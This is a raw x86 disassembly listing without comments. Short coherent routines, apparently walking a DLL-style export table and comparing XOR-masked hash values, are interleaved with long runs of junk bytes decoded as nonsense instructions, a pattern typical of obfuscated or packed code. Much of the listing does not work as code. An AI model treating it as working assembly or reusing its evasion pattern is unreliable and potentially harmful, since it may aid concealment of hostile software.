  40b938:	dec    BYTE PTR [ecx+0x458bd44d]
  40b93e:	in     al,dx
  40b93f:	mov    ecx,DWORD PTR [ebp+0x8]
  40b942:	add    ecx,DWORD PTR [eax+0x1c]
  40b945:	xor    esi,esi
  40b947:	mov    DWORD PTR [ebp-0x14],ecx
  40b94a:	mov    eax,DWORD PTR [ebp-0x28]
  40b94d:	mov    ecx,DWORD PTR [ebp+0x8]
  40b950:	add    ecx,DWORD PTR [eax+edi*4]
  40b953:	jmp    0x40ba38
  40b958:	pop    ss
  40b959:	pusha  
  40b95a:	pop    esp
  40b95b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b95c:	jns    0x40b916
  40b95e:	out    0x61,eax
  40b960:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b961:	push   ds
  40b962:	jg     0x40b96d
  40b964:	out    dx,eax
  40b965:	scas   eax,DWORD PTR es:[edi]
  40b966:	inc    ebp
  40b967:	xchg   BYTE PTR [ecx+0x33],bh
  40b96a:	jle    0x40b9ea
  40b96c:	mov    dh,0x7e
  40b96e:	jle    0x40b9ee
  40b970:	mov    al,ds:0x5cd266c2
  40b975:	nop
  40b976:	xor    eax,0xf2ba58a2
  40b97b:	xchg   esp,eax
  40b97c:	pushf  
  40b97d:	nop
  40b97e:	jnp    0x40b949
  40b980:	inc    esp
  40b981:	cmc    
  40b982:	fwait
  40b983:	loop   0x40b987
  40b985:	jb     0x40b932
  40b987:	mov    ecx,0x4b35dd49
  40b98c:	xor    edi,DWORD PTR [ecx+0x59]
  40b98f:	sti    
  40b990:	pop    edx
  40b991:	sar    esp,0x10
  40b994:	adc    DWORD PTR [esi+0x30],esp
  40b997:	fs nop
  40b999:	adc    eax,0x388e36b5
  40b99e:	rcr    DWORD PTR [edi-0x87a8f9b],0x4b
  40b9a5:	pop    esi
  40b9a6:	call   0x22f2:0x39581688
  40b9ad:	dec    esp
  40b9ae:	fcomip st,st(6)
  40b9b0:	je     0x40b997
  40b9b2:	fisubr DWORD PTR [edi]
  40b9b4:	add    al,0x9
  40b9b6:	push   esp
  40b9b7:	out    0xee,eax
  40b9b9:	jge    0x40b9c8
  40b9bb:	sbb    edi,DWORD PTR [edi+0x18c18384]
  40b9c1:	(bad)  
  40b9c2:	mov    ds:0xb9d4e0db,al
  40b9c7:	lods   eax,DWORD PTR ds:[esi]
  40b9c8:	out    dx,eax
  40b9c9:	adc    DWORD PTR [esi+0x269bdd08],ebx
  40b9cf:	arpl   cx,si
  40b9d1:	push   cs
  40b9d2:	push   ebp
  40b9d3:	pop    es
  40b9d4:	dec    esi
  40b9d5:	or     cl,BYTE PTR [ecx-0x625da2d4]
  40b9db:	push   esp
  40b9dc:	std    
  40b9dd:	fist   WORD PTR [ecx]
  40b9df:	test   BYTE PTR [ecx],0x88
  40b9e2:	cmp    BYTE PTR [edi+0x190ab1b5],bl
  40b9e8:	lods   al,BYTE PTR ds:[esi]
  40b9e9:	in     eax,dx
  40b9ea:	icebp  
  40b9eb:	mov    ds:0x54c0e5ba,al
  40b9f0:	mov    al,0x8d
  40b9f2:	lea    edx,[edi]
  40b9f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b9f5:	xchg   ebx,eax
  40b9f6:	daa    
  40b9f7:	push   edi
  40b9f8:	and    cl,BYTE PTR [ecx+0x36f3ea7b]
  40b9fe:	mov    ah,0x81
  40ba00:	addr16 push 0x1fe98369
  40ba06:	push   ss
  40ba07:	push   esi
  40ba08:	adc    BYTE PTR [eax+0x241baf48],ah
  40ba0e:	ins    DWORD PTR es:[edi],dx
  40ba0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba10:	mov    esp,0x93a5607e
  40ba15:	push   esi
  40ba16:	push   ecx
  40ba17:	xlat   BYTE PTR ds:[ebx]
  40ba18:	leave  
  40ba19:	push   cs
  40ba1a:	ror    BYTE PTR [ecx-0x43a4e5fd],cl
  40ba20:	mov    cl,0x40
  40ba22:	sub    DWORD PTR [edi],esi
  40ba24:	xchg   ebx,eax
  40ba25:	xchg   ecx,eax
  40ba26:	into   
  40ba27:	jmp    0xddbd:0x3beb5664
  40ba2e:	push   ebx
  40ba2f:	das    
  40ba30:	add    ah,BYTE PTR [edi+ebx*1+0x59]
  40ba34:	int3   
  40ba35:	stos   BYTE PTR es:[di],al
  40ba37:	ror    DWORD PTR [ebp+0x4d89f845],0xd0
  40ba3e:	push   eax
  40ba3f:	push   DWORD PTR [ebp-0x30]
  40ba42:	push   DWORD PTR [ebp+0xc]
  40ba45:	call   0x408325
  40ba4a:	mov    eax,DWORD PTR [ebp-0x4]
  40ba4d:	mov    ecx,DWORD PTR [ebp-0x8]
  40ba50:	xor    eax,0x7510859
  40ba55:	add    eax,ebx
  40ba57:	cmp    ecx,eax
  40ba59:	jne    0x40bb61
  40ba5f:	mov    eax,DWORD PTR [ebp-0x20]
  40ba62:	jmp    0x40bb47
  40ba67:	test   BYTE PTR [ebx+0x5b],al
  40ba6a:	scas   al,BYTE PTR es:[edi]
  40ba6b:	pop    ecx
  40ba6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba6d:	jns    0x40bae8
  40ba6f:	and    BYTE PTR [ebx+0x63],cl
  40ba72:	lock mov BYTE PTR [esi+0x30b12e9d],dh
  40ba79:	jle    0x40baf9
  40ba7b:	mov    dh,0x7e
  40ba7d:	jle    0x40bafd
  40ba7f:	lods   al,BYTE PTR ds:[esi]
  40ba80:	adc    DWORD PTR [ecx],edx
  40ba82:	inc    ebp
  40ba83:	mov    esi,0x3b7a6232
  40ba88:	loop   0x40baba
  40ba8a:	mov    WORD PTR [esi+0x15],gs
  40ba8d:	in     al,dx
  40ba8e:	sbb    DWORD PTR [esi+0x3d],ecx
  40ba91:	inc    esp
  40ba92:	ret    
  40ba93:	inc    esp
  40ba94:	pop    ds
  40ba95:	inc    esp
  40ba96:	sub    edi,DWORD PTR [ebx+ebx*2-0x64]
  40ba9a:	inc    esp
  40ba9b:	adc    dh,dh
  40ba9d:	xchg   esi,eax
  40ba9e:	mov    al,0xc8
  40baa0:	(bad)  
  40baa1:	adc    DWORD PTR [ecx-0x20b4ca4c],esp
  40baa7:	aad    0xf2
  40baa9:	add    eax,0xcec5508b
  40baae:	pop    ds
  40baaf:	xchg   BYTE PTR [esi],bl
  40bab1:	and    DWORD PTR [ebx],edi
  40bab3:	jle    0x40bb03
  40bab5:	xchg   edx,eax
  40bab6:	jl     0x40baf7
  40bab8:	mov    edi,0x5accb75a
  40babd:	js     0x40bb34
  40babf:	push   eax
  40bac0:	data16 or BYTE PTR [edx],ch
  40bac3:	xchg   edx,eax
  40bac4:	lea    eax,[esi-0x5f]
  40bac7:	cmp    eax,0x488d83ff
  40bacc:	fs pop es
  40bace:	nop
  40bacf:	xor    eax,0x27af1570
  40bad4:	arpl   bx,sp
  40bad6:	dec    ebp
  40bad7:	jmp    0xf0d0f76b
  40badc:	aas    
  40badd:	arpl   cx,di
  40badf:	sub    BYTE PTR [edx],bl
  40bae1:	cmp    al,0xa2
  40bae3:	(bad)  
  40bae5:	test   BYTE PTR [edi+0x68deb1eb],0xbc
  40baec:	out    0x4,eax
  40baee:	sub    al,bl
  40baf0:	lahf   
  40baf1:	xchg   ebx,eax
  40baf2:	(bad)  [eax-0x526e9db7]
  40baf8:	(bad)  
  40baf9:	(bad)
  40bafc:	jl     0x40bb42
  40bafe:	cmp    eax,0xe1785acd
  40bb03:	push   edi
  40bb04:	sbb    esi,esp
  40bb06:	cmc    
  40bb07:	xor    DWORD PTR [edx],ebx
  40bb09:	mov    eax,ds:0x13147076
  40bb0e:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  40bb10:	cmp    eax,0xcdd664e5
  40bb15:	jp     0x40bb7d
  40bb17:	push   edx
  40bb18:	inc    edx
  40bb19:	and    BYTE PTR [eax],0x78
  40bb1c:	cmc    
  40bb1d:	xor    edx,DWORD PTR [ebp-0x19]
  40bb20:	out    0x38,eax
  40bb22:	lock sub ecx,DWORD PTR [esi+0x35]
  40bb26:	fimul  DWORD PTR [ecx+0x7e]
  40bb29:	(bad)  
  40bb2a:	cmp    DWORD PTR [edx+0x21],ebp
  40bb2d:	xor    edi,ebx
  40bb2f:	pop    ds
  40bb30:	push   eax
  40bb31:	jmp    0x40bacc
  40bb33:	pop    ecx
  40bb34:	xor    al,0xb6
  40bb36:	aad    0x10
  40bb38:	outs   dx,DWORD PTR ds:[esi]
  40bb39:	sti    
  40bb3a:	xor    dh,cl
  40bb3c:	bound  edi,QWORD PTR [edx-0x4]
  40bb3f:	mov    eax,0x1c9edb82
  40bb44:	dec    eax
  40bb45:	mov    bl,0xf5
  40bb47:	inc    edi
  40bb48:	cmp    edi,eax
  40bb4a:	jb     0x40b2a5
  40bb50:	jmp    0x40bb71
  40bb55:	mov    eax,DWORD PTR [ebp-0x4]
  40bb58:	xor    eax,esi
  40bb5a:	add    eax,ebx
  40bb5c:	jmp    0x40c696
  40bb61:	mov    eax,DWORD PTR [ebp-0x2c]
  40bb64:	movzx  eax,WORD PTR [eax+edi*2]
  40bb68:	mov    ecx,DWORD PTR [ebp-0x14]
  40bb6b:	mov    eax,DWORD PTR [ecx+eax*4]
  40bb6e:	mov    DWORD PTR [ebp+0xc],eax
  40bb71:	mov    eax,DWORD PTR [ebp-0x4]
  40bb74:	mov    ecx,DWORD PTR [ebp-0x8]
  40bb77:	xor    eax,0x7510859
  40bb7c:	add    eax,ebx
  40bb7e:	cmp    ecx,eax
  40bb80:	jne    0x40bb93
  40bb86:	mov    eax,DWORD PTR [ebp-0x4]
  40bb89:	xor    eax,0x7510859
  40bb8e:	jmp    0x40bb5a
  40bb93:	mov    eax,DWORD PTR [ebp+0xc]
  40bb96:	add    eax,DWORD PTR [ebp+0x8]
  40bb99:	mov    DWORD PTR [ebp-0x10],eax
  40bb9c:	mov    eax,DWORD PTR [ebp-0x1c]
  40bb9f:	test   eax,eax
  40bba1:	je     0x40c2b4
  40bba7:	mov    DWORD PTR [ebp-0x24],esi
  40bbaa:	push   0xb
  40bbac:	pop    ecx
  40bbad:	push   0x5
  40bbaf:	dec    ecx
  40bbb0:	jmp    0x40bc95
  40bbb5:	pop    ss
  40bbb6:	imul   dh
  40bbb8:	mov    bl,0x6f
  40bbba:	jnp    0x40bb77
  40bbbc:	push   0xffffffce
  40bbbe:	pop    ecx
  40bbbf:	and    esi,ebx
  40bbc1:	cdq    
  40bbc2:	xchg   esp,eax
  40bbc3:	jnp    0x40bb7b
  40bbc5:	mov    DWORD PTR [ecx],esi
  40bbc7:	jle    0x40bc47
  40bbc9:	mov    dh,0x7e
  40bbcb:	jle    0x40bc4b
  40bbcd:	inc    edi
  40bbce:	out    dx,al
  40bbcf:	pop    ecx
  40bbd0:	cli    
  40bbd1:	popf   
  40bbd2:	push   ss
  40bbd3:	xor    ebx,DWORD PTR [eax]
  40bbd5:	jmp    0x40bbaa
  40bbd7:	cmp    DWORD PTR [esi-0x70],esi
  40bbda:	sub    BYTE PTR [edx-0x1fc2bafd],bl
  40bbe0:	sbb    DWORD PTR [ebx-0x7038d396],ebx
  40bbe6:	dec    esp
  40bbe7:	mov    WORD PTR [esi+edx*2],ds
  40bbea:	leave  
  40bbeb:	jne    0x40bbc3
  40bbed:	leave  
  40bbee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bbef:	sub    BYTE PTR [edx-0x10167094],dh
  40bbf5:	xor    ebp,DWORD PTR [edi+ebx*8-0x68]
  40bbf9:	xchg   edi,eax
  40bbfa:	push   ebp
  40bbfb:	mov    cl,0x6d
  40bbfd:	inc    eax
  40bbfe:	or     al,ah
  40bc00:	and    BYTE PTR [ecx],bh
  40bc02:	add    eax,0xc695a98d
  40bc07:	test   DWORD PTR [ebx+edi*1],0x531126e0
  40bc0e:	rcl    DWORD PTR [ebx+edi*4-0x47b130e9],1
  40bc15:	dec    ebx
  40bc16:	imul   ecx,DWORD PTR [ebp+0x24d88f13],0xb
  40bc1d:	add    ch,BYTE PTR [esi-0x5f677530]
  40bc23:	xchg   ebx,eax
  40bc24:	jp     0x40bc15
  40bc26:	pop    ds
  40bc27:	aaa    
  40bc28:	repz js 0x40bca8
  40bc2b:	cmp    al,0x53
  40bc2d:	mov    al,ds:0xb3f768ad
  40bc32:	into   
  40bc33:	pop    eax
  40bc34:	call   0x3ff:0x5af92053
  40bc3b:	push   ss
  40bc3c:	add    bh,BYTE PTR [ebx+0x54]
  40bc3f:	push   0x26
  40bc41:	hlt    
  40bc42:	fst    DWORD PTR [edx-0xb]
  40bc45:	outs   dx,BYTE PTR ds:[esi]
  40bc46:	aaa    
  40bc47:	cwde   
  40bc48:	ds loop 0x40bbe6
  40bc4b:	push   ebp
  40bc4c:	in     eax,dx
  40bc4d:	dec    edx
  40bc4e:	and    BYTE PTR [ebp-0x4c],dl
  40bc51:	cli    
  40bc52:	shl    BYTE PTR [esi+0x3d8f408],1
  40bc58:	test   DWORD PTR [ecx],ecx
  40bc5a:	leave  
  40bc5b:	hlt    
  40bc5c:	xor    eax,0x8c8ebdcc
  40bc61:	sbb    BYTE PTR [ecx-0x52],0x41
  40bc65:	jbe    0x40bcbc
  40bc67:	stos   DWORD PTR es:[edi],eax
  40bc68:	mov    ebx,0xb5768c49
  40bc6d:	sub    al,0xff
  40bc6f:	ins    DWORD PTR es:[edi],dx
  40bc70:	pop    edi
  40bc71:	into   
  40bc72:	test   BYTE PTR [ecx+0x22],cl
  40bc75:	leave  
  40bc76:	pop    ds
  40bc77:	jge    0x40bce7
  40bc79:	scas   eax,DWORD PTR es:[edi]
  40bc7a:	and    bh,BYTE PTR [ebx+0x12]
  40bc7d:	mov    bl,0x12
  40bc7f:	(bad)  
  40bc80:	fistp  WORD PTR [edx+ecx*1]
  40bc83:	test   DWORD PTR [edx-0x39],edi
  40bc86:	sahf   
  40bc87:	mov    al,ds:0x64ce8540
  40bc8c:	jmp    0x40bca3
  40bc8e:	ins    BYTE PTR es:[edi],dx
  40bc8f:	dec    ebp
  40bc90:	clc    
  40bc91:	imul   DWORD PTR [ebx]
  40bc93:	call   0xd92b:0xcb875b8b
  40bc9a:	xchg   ebx,ecx
  40bc9c:	dec    ecx
  40bc9d:	mov    eax,DWORD PTR [ebp-0x1c]
  40bca0:	imul   eax,ecx
  40bca3:	sub    esp,eax
  40bca5:	mov    DWORD PTR [ebp-0x24],esp
  40bca8:	mov    eax,DWORD PTR [ebp-0x4]
  40bcab:	mov    ecx,0x7510859
  40bcb0:	jmp    0x40bd95
  40bcb5:	xchg   edi,eax
  40bcb6:	adc    DWORD PTR [ecx+eax*2+0x78],0x79
  40bcbb:	mov    ebx,0xdff72d79
  40bcc0:	ins    DWORD PTR es:[edi],dx
  40bcc1:	add    eax,esp
  40bcc3:	xchg   edx,eax
  40bcc4:	sahf   
  40bcc5:	shl    DWORD PTR [esi],0x7e
  40bcc8:	jle    0x40bc80
  40bcca:	jle    0x40bd4a
  40bccc:	jle    0x40bc6d
  40bcce:	shl    DWORD PTR [edi-0x7e],cl
  40bcd1:	or     eax,0x820060b
  40bcd6:	daa    
  40bcd7:	xchg   edx,eax
  40bcd8:	dec    eax
  40bcd9:	fldenv [ebx-0x6ec9bed3]
  40bcdf:	mov    edx,0x9ed223e8
  40bce4:	inc    eax
  40bce5:	iret   
  40bce6:	mov    ebp,0x94d9f8c6
  40bceb:	jns    0x40bcdc
  40bced:	cmc    
  40bcee:	dec    ebp
  40bcef:	hlt    
  40bcf0:	mov    bl,0xa8
  40bcf2:	out    dx,al
  40bcf3:	dec    ecx
  40bcf4:	fistp  DWORD PTR [eax+0x6d]
  40bcf7:	add    eax,DWORD PTR [edi-0x7b]
  40bcfa:	jg     0x40bd69
  40bcfc:	leave  
  40bcfd:	mov    DWORD PTR ss:[esi-0x512d66cd],ebp
  40bd04:	push   esp
  40bd05:	inc    ebx
  40bd06:	gs jae 0x40bc91
  40bd09:	jge    0x40bcc2
  40bd0b:	les    edi,FWORD PTR [ebx+0x5948d609]
  40bd11:	jl     0x40bd16
  40bd13:	out    0xcd,eax
  40bd15:	lea    esi,[esi+0x586f3d63]
  40bd1b:	dec    ecx
  40bd1c:	loopne 0x40bd52
  40bd1e:	xor    esi,DWORD PTR [ebx-0x3db809b4]
  40bd24:	(bad)  
  40bd25:	gs dec edi
  40bd27:	or     BYTE PTR [edx+0x525872d7],dh
  40bd2d:	mov    eax,DWORD PTR [edi+0x1dfa3f29]
  40bd33:	xchg   ebp,eax
  40bd34:	sahf   
  40bd35:	sbb    ah,BYTE PTR [eax+0x5d]
  40bd38:	repz mov al,ds:0x822193d7
  40bd3e:	jp     0x40bd6b
  40bd40:	sbb    eax,0xdb1fcfba
  40bd45:	push   es
  40bd46:	and    BYTE PTR [ecx-0x9],bl
  40bd49:	in     al,dx
  40bd4a:	xor    ch,ch
  40bd4c:	in     eax,0x5a
  40bd4e:	jb     0x40bd08
  40bd50:	mul    DWORD PTR [ecx-0x1e414179]
  40bd56:	and    eax,0x8e6b8c6d
  40bd5b:	adc    edx,DWORD PTR [ebx+0xa]
  40bd5e:	jecxz  0x40bdaf
  40bd60:	sub    cl,BYTE PTR [esi+ebp*8-0x7fd6ecb8]
  40bd67:	jg     0x40bcea
  40bd69:	stos   BYTE PTR es:[edi],al
  40bd6a:	xor    al,0x35
  40bd6c:	cs xchg edx,eax
  40bd6e:	inc    esp
  40bd6f:	sub    al,0x5
  40bd71:	int    0x2c
  40bd73:	ds call 0xa9344db2
  40bd79:	jae    0x40bd02
  40bd7b:	inc    ebx
  40bd7c:	pop    ebx
  40bd7d:	(bad)
  40bd80:	xlat   BYTE PTR ds:[ebx]
  40bd81:	neg    BYTE PTR [ecx]
  40bd83:	out    0x8e,eax
  40bd85:	sbb    al,0xcd
  40bd87:	add    ebp,DWORD PTR [eax-0x60]
  40bd8a:	dec    ebx
  40bd8b:	imul   eax,DWORD PTR [eax+ecx*1+0x7d],0x40e97071
  40bd93:	retf   
  40bd94:	cmp    DWORD PTR [ebx],esi
  40bd96:	sar    DWORD PTR [edx+0x32729f],0x3
  40bd9d:	ret    0x4589
  40bda0:	or     BYTE PTR [ebx-0x3ecc17bb],cl
  40bda6:	add    eax,edx
  40bda8:	mov    edx,DWORD PTR [ebp+0x14]
  40bdab:	jmp    0x40be90
  40bdb0:	dec    DWORD PTR [ebx-0x47d6c7ef]
  40bdb6:	xchg   DWORD PTR [ecx-0x43979b07],edi
  40bdbc:	jo     0x40bd55
  40bdbe:	js     0x40bd70
  40bdc0:	sbb    DWORD PTR [edi],esi
  40bdc2:	jle    0x40be42
  40bdc4:	mov    dh,0x7e
  40bdc6:	jle    0x40be46
  40bdc8:	xor    al,0x6
  40bdca:	or     BYTE PTR [ecx-0x76],cl
  40bdcd:	push   ecx
  40bdce:	xchg   ebx,eax
  40bdcf:	pop    esp
  40bdd0:	leave  
  40bdd1:	jno    0x40be40
  40bdd3:	leave  
  40bdd4:	mov    ebp,0x3d97f222
  40bdd9:	sahf   
  40bdda:	push   edi
  40bddb:	cmp    al,cl
  40bddd:	and    eax,0x4e6eb71
  40bde2:	pop    ebp
  40bde3:	fbstp  TBYTE PTR [edi+0x4a]
  40bde6:	fimul  DWORD PTR [ebx-0x1d08823f]
  40bdec:	xor    dl,BYTE PTR [edx+0x68cd68cc]
  40bdf2:	push   ebx
  40bdf3:	mov    eax,ds:0x15ac7bc
  40bdf8:	rcl    cl,1
  40bdfa:	in     eax,0xd6
  40bdfc:	jg     0x40be5d
  40bdfe:	mov    esp,0x9a90f6cc
  40be03:	leave  
  40be04:	test   eax,0x15de8875
  40be09:	jb     0x40bdaf
  40be0b:	push   ds
  40be0c:	sub    al,0xdf
  40be0e:	inc    eax
  40be0f:	aam    0x7b
  40be11:	dec    edi
  40be12:	dec    edi
  40be13:	repz jne 0x40bdbb
  40be16:	mov    esp,0xf5da14f3
  40be1b:	mov    ecx,0xc99b1f34
  40be20:	fld    QWORD PTR [esi]
  40be22:	out    0x6b,eax
  40be24:	sub    DWORD PTR [ebx],ecx
  40be26:	adc    edx,eax
  40be28:	dec    esi
  40be29:	les    ecx,FWORD PTR [ecx-0x60824126]
  40be2f:	pushf  
  40be30:	lds    esp,FWORD PTR [ebp+0x3b]
  40be33:	jae    0x40be30
  40be35:	adc    al,0x68
  40be37:	jge    0x40be70
  40be39:	scas   eax,DWORD PTR es:[edi]
  40be3a:	fcomp  st(7)
  40be3c:	mov    esi,0x3c8f8da3
  40be41:	dec    BYTE PTR [edi]
  40be43:	neg    DWORD PTR [edi-0xf8bf23a]
  40be49:	mov    eax,ds:0x15a43c88
  40be4e:	cmp    DWORD PTR [esp+edi*8],esp
  40be51:	adc    DWORD PTR [eax+0x63],eax
  40be54:	cmc    
  40be55:	or     cl,al
  40be57:	(bad)  
  40be58:	sbb    edi,edx
  40be5a:	sbb    al,BYTE PTR [ebx+ebp*2-0x7e4937b9]
  40be61:	mov    edi,0xdb81ffd9
  40be66:	in     al,dx
  40be67:	cmp    DWORD PTR [edi],ebp
  40be69:	mov    DWORD PTR [ecx-0x67a54f0e],esi
  40be6f:	lock mov dh,BYTE PTR [ebx+eax*8+0x78]
  40be74:	push   ss
  40be75:	xchg   esi,eax
  40be76:	ret    0xe004
  40be79:	inc    eax
  40be7a:	push   edi
  40be7b:	xchg   esi,eax
  40be7c:	dec    edi
  40be7d:	lea    ebp,[edi]
  40be7f:	fsub   QWORD PTR [ecx]
  40be81:	dec    ebp
  40be82:	in     al,0x1d
  40be84:	in     eax,dx
  40be85:	mov    bh,0xa3
  40be87:	push   ebx
  40be88:	dec    eax
  40be89:	pop    ss
  40be8a:	mov    edx,0x801695ff
  40be8f:	mov    eax,0xe902af0f
  40be94:	loopne 0x40be96
  40be96:	add    BYTE PTR [eax],al
  40be98:	inc    ebp
  40be99:	loop   0x40be83
  40be9b:	xchg   edi,eax
  40be9c:	imul   esp,DWORD PTR [ebp-0x36f31fa7],0xcb257640
  40bea6:	leave  
  40bea7:	loop   0x40befa
  40bea9:	aaa    
  40beaa:	jle    0x40bf2a
  40beac:	mov    dh,0x7e
  40beae:	jle    0x40bf2e
  40beb0:	addr16 mov ds:0x67c2,al
  40beb4:	ja     0x40be8d
  40beb6:	lods   eax,DWORD PTR ds:[esi]
  40beb7:	push   esp
  40beb8:	or     eax,0x43d9b7ad
  40bebd:	stos   DWORD PTR es:[edi],eax
  40bebe:	mov    esp,0x5e6d35e7
  40bec3:	js     0x40be5a
  40bec5:	repnz mov ah,0xca
  40bec8:	loope  0x40bec5
  40beca:	jns    0x40bf34
  40becc:	cmp    DWORD PTR [eax+eax*8+0x12de829e],esi
  40bed3:	xor    esi,DWORD PTR [esi]
  40bed5:	out    dx,al
  40bed6:	arpl   si,di
  40bed8:	sub    eax,0xf2283e88
  40bedd:	(bad)  
  40bede:	mov    BYTE PTR [ebp+0x1ad531e7],ch
  40bee4:	scas   eax,DWORD PTR es:[edi]
  40bee5:	dec    edx
  40bee6:	dec    ebp
  40bee7:	adc    BYTE PTR [esi],dh
  40bee9:	in     eax,0xa0
  40beeb:	scas   al,BYTE PTR es:[edi]
  40beec:	fwait
  40beed:	es dec esp
  40beef:	or     al,0x4
  40bef1:	test   BYTE PTR [edx+0x64819c41],ch
  40bef7:	mov    ds:0xcd55b4a3,eax
  40befc:	mov    al,ds:0x41509ea5
  40bf01:	cli    
  40bf02:	mov    gs,ebx
  40bf04:	xchg   BYTE PTR [esi+0x34],cl
  40bf07:	pop    ds
  40bf08:	sahf   
  40bf09:	in     eax,0x42
  40bf0b:	and    bh,BYTE PTR [edi+0xc]
  40bf0e:	rol    BYTE PTR [esi-0x7c6ea1c3],cl
  40bf14:	fcom   st(2)
  40bf16:	fwait
  40bf17:	out    dx,eax
  40bf18:	push   ebx
  40bf19:	jg     0x40bf2c
  40bf1b:	jp     0x40bf31
  40bf1d:	add    BYTE PTR [edx],dh
  40bf1f:	adc    DWORD PTR [ecx+0x64],esi
  40bf22:	ret    0x4b57
  40bf25:	xchg   ebp,eax
  40bf26:	pop    edi
  40bf27:	arpl   WORD PTR [ebx-0x25],dx
  40bf2a:	pop    ds
  40bf2b:	pop    esi
  40bf2c:	dec    BYTE PTR [ecx]
  40bf2e:	sbb    DWORD PTR [ebp-0x15],ecx
  40bf31:	mov    al,0x8e
  40bf33:	dec    ecx
  40bf34:	fstp   DWORD PTR [ebx+eiz*8-0x3d]
  40bf38:	mov    ebx,0xe7fbaf67
  40bf3d:	scas   al,BYTE PTR es:[edi]
  40bf3e:	adc    ecx,DWORD PTR [ecx-0x137eed0c]
  40bf44:	push   cs
  40bf45:	aas    
  40bf46:	xchg   edi,eax
  40bf47:	ss into 
  40bf49:	mov    dl,BYTE PTR [esi+0x73]
  40bf4c:	cld    
  40bf4d:	mov    ds:0x83cc74d2,al
  40bf52:	adc    eax,0x8f28db66
  40bf57:	xchg   ecx,eax
  40bf58:	or     BYTE PTR [esi+edx*1],ah
  40bf5b:	sub    eax,0xbc06bab4
  40bf60:	or     BYTE PTR [eax+0x427337a3],ch
  40bf66:	fnsave [edx-0x9e3f822]
  40bf6c:	mov    WORD PTR [esi-0x50182ae7],fs
  40bf72:	push   ecx
  40bf73:	push   edx
  40bf74:	test   eax,0x8b3f8db8
  40bf79:	push   ebp
  40bf7a:	cld    
  40bf7b:	xor    edx,ecx
  40bf7d:	mov    ecx,DWORD PTR [ebp+0x8]
  40bf80:	lea    ecx,[edx+ecx*1+0x32729f]
  40bf87:	cmp    ecx,eax
  40bf89:	je     0x40c1ca
  40bf8f:	mov    edi,DWORD PTR [ebp-0x18]
  40bf92:	mov    eax,DWORD PTR [ebp+0x8]
  40bf95:	mov    edx,DWORD PTR [ebp+0x14]
  40bf98:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40bf9c:	jmp    0x40c081
  40bfa1:	pop    ss
  40bfa2:	sub    al,0x93
  40bfa4:	sub    edi,DWORD PTR [ecx+0x192097b9]
  40bfaa:	jne    0x40bf81
  40bfac:	stos   BYTE PTR es:[edi],al
  40bfad:	push   edi
  40bfae:	dec    eax
  40bfaf:	fadd   QWORD PTR [ebx-0x57]
  40bfb2:	xor    al,0x7e
  40bfb4:	jle    0x40bf6c
  40bfb6:	jle    0x40c036
  40bfb8:	jle    0x40bf43
  40bfba:	and    ebp,DWORD PTR [edi]
  40bfbc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bfbd:	neg    DWORD PTR [esi+0x9]
  40bfc0:	popa   
  40bfc1:	and    ch,BYTE PTR [esi]
  40bfc3:	fcom   st(2)
  40bfc5:	out    dx,al
  40bfc6:	push   ds
  40bfc7:	sbb    bh,al
  40bfc9:	xchg   BYTE PTR [edi+0x339f4ec1],al
  40bfcf:	cmp    DWORD PTR [esi+0x19],edi
  40bfd2:	pop    ebp
  40bfd3:	xor    edx,DWORD PTR [ebp-0x31f73d75]
  40bfd9:	xchg   esp,eax
  40bfda:	xor    DWORD PTR [edx+ebp*2],eax
  40bfdd:	push   cs
  40bfde:	fidiv  DWORD PTR [ebx-0x63]
  40bfe1:	neg    DWORD PTR [ecx-0x6a]
  40bfe4:	mov    ah,al
  40bfe6:	rcl    BYTE PTR [eax],cl
  40bfe8:	cld    
  40bfe9:	mov    ds:0xe3560b92,eax
  40bfee:	sbb    al,0xc9
  40bff0:	scas   eax,DWORD PTR es:[edi]
  40bff1:	xchg   ecx,eax
  40bff2:	pop    es
  40bff3:	xor    eax,0x7a72f628
  40bff8:	add    ah,BYTE PTR [esi+0x68]
  40bffb:	pushf  
  40bffc:	push   es
  40bffd:	fs stc 
  40bfff:	call   FWORD PTR [esi+0x60ff7228]
  40c005:	inc    ebp
  40c006:	or     DWORD PTR [ecx-0x731c4280],0x28
  40c00d:	bound  ebx,QWORD PTR [esi+0x45]
  40c010:	sub    eax,0x7cb63e10
  40c015:	out    dx,al
  40c016:	pushf  
  40c017:	(bad)  
  40c018:	push   ebx
  40c019:	mov    ecx,0x248aa081
  40c01e:	rcr    DWORD PTR [ebp-0x7c12f19b],0x52
  40c025:	leave  
  40c026:	test   dl,ah
  40c028:	mov    esi,0xb97cdbca
  40c02d:	and    eax,0x8aea21d
  40c032:	fwait
  40c033:	outs   dx,BYTE PTR ds:[esi]
  40c034:	push   0x29ecb2b0
  40c039:	bound  eax,QWORD PTR [eax]
  40c03b:	xchg   ebp,eax
  40c03c:	ds cwde 
  40c03e:	sub    eax,0x46290c92
  40c043:	sub    cl,bh
  40c045:	mov    BYTE PTR [esi+0x7d],cl
  40c048:	imul   ecx,DWORD PTR [ebx],0x29c00472
  40c04e:	jge    0x40bffc
  40c050:	sub    eax,0xe5408e6e
  40c055:	cwde   
  40c056:	into   
  40c057:	ins    DWORD PTR es:[edi],dx
  40c058:	pop    ss
  40c059:	jg     0x40c057
  40c05b:	adc    DWORD PTR ds:0x6bcd29a5,edi
  40c061:	es loopne 0x40bfed
  40c064:	mov    DWORD PTR [edi],0xfabf0d7f
  40c06a:	jp     0x40c04b
  40c06c:	xchg   ebx,eax
  40c06d:	test   edx,0x332361e7
  40c073:	ror    BYTE PTR [ebp+0x2a5e2a2c],cl
  40c079:	(bad)  
  40c07a:	std    
  40c07b:	frstor es:[edi-0x46d8fd0e]
  40c082:	pop    ecx
  40c083:	or     BYTE PTR [ecx+0x7],dl
  40c086:	xor    edx,edx
  40c088:	xor    edi,ecx
  40c08a:	mov    esi,0x32729f
  40c08f:	add    edi,esi
  40c091:	div    edi
  40c093:	mov    edx,DWORD PTR [ebp-0x4]
  40c096:	xor    edx,ecx
  40c098:	lea    eax,[edx+eax*1+0x32729f]
  40c09f:	mov    edx,DWORD PTR [ebp+0x8]
